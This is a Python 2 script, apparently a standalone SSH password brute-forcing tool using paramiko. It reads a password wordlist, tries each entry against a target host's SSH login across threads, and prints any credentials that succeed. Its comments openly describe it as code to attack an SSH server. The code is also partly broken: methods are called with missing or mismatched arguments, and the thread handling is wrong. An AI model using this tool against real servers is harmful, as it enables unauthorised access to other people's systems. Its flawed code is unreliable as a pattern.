#coding:utf-8

import re
import threading
import options
import sys
import Queue
import paramiko

class SSHArgumentNotFound(Exception):
	def __init__(self, ArgumentExcepts=None):
		self.ArgumentExcepts = ArgumentExcepts

class SSHIncorrectAddress(Exception):
	def __init__(self, OutputCondition=None):
		self.OutputCondition = OutputCondition

def OutputArgument():
	'''
		This function will test the
		necessary variables and arguments.
	'''
	ArgsHOST = re.findall(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", options.HOST)
	if(type(ArgsHOST) == list and len(ArgsHOST) == 0):
		raise SSHIncorrectAddress("Incorrect Address SSH sorry.")

	# We already start the mistakes to do that.
	# I create an express function for that.

class SSHLooper(threading.Thread):
	def __init__(self, THREADS=35):
		'''
			The pretty well-known parameters
			that I will put in the function.
		'''
		self.HOST = options.HOST
		self.USER = options.USER
		self.PASSWORD = options.PASSWORD
		self.THREADS = THREADS

		threading.Thread.__init__(self)
		self.run()

	def ExtensionModel(self, q):
		'''
			This function will attack the
			SSH server, and send SSH questes
		'''
		while True:
			PropertyService = q.get()
			try:
				# If he goes in we will have access to the password
				# It's a very simple bruteforce code in Python

				SSHClient = paramiko.SSHClient()
				SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				SSHClient.connect(self.HOST, username=self.USER, password=PropertyService)
				print "[+] AuthenticationSuccess : %s/%s" %(self.USER, PropertyService)

				# You can always contact me on Twitter.
				# We manage the exceptions, to avoid some error.
			except paramiko.ssh_exception.AuthenticationException as e:
				print "[!] AuthenticationException error : %s/%s" %(self.USER, PropertyService)
			except paramiko.ssh_exception.NoValidConnectionsError as e:
				sys.exit(e)
			except paramiko.ssh_exception.SSHException as e:
				pass

	def run(self):
		'''
			This feature allows you to manage
			threads and all their functionality.
		'''
		q = Queue.Queue()
		with open(self.PASSWORD, "r") as BertModel:
			for Queue_Reverse in BertModel:
				q.put(Queue_Reverse.rstrip("\n\r"))
			self.ExtensionModel(q)

		for i in range(int(self.THREADS)):
			worker = threading.Thread(target=self.ExtensionModel, args=(i, q))
			worker.setDaemon(True)
			worker.start()
			worker.join(600)

		q.join()

if __name__ == "__main__":
	argument = SSHLooper()
	argument.ExtensionModel()
